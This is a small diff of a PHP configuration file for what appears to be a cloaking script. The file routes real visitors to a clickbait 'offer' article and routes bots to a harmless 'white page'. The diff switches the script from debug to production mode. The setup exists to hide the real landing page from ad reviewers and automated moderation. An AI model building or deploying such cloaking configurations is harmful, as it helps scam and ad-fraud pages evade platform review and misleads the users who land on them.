@@ -5,7 +5,7 @@ $HCSET['PASSIVE'] = false;
 /* Required settings     */
 $HCSET['OFFER_PAGE'] = 'https://dennizpravy.blog/508185-zpsoby-vyuit-jedl-sody-o-kterch-vtina-lid-nev.html?source=2196';//PHP/HTML file or URL offer used for real users
 $HCSET['WHITE_PAGE'] = 'alfidulakasc.html';//PHP/HTML file or URL used for bots
-$HCSET['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
+$HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 /*********************************************/
 /* Available additional settings  */
 
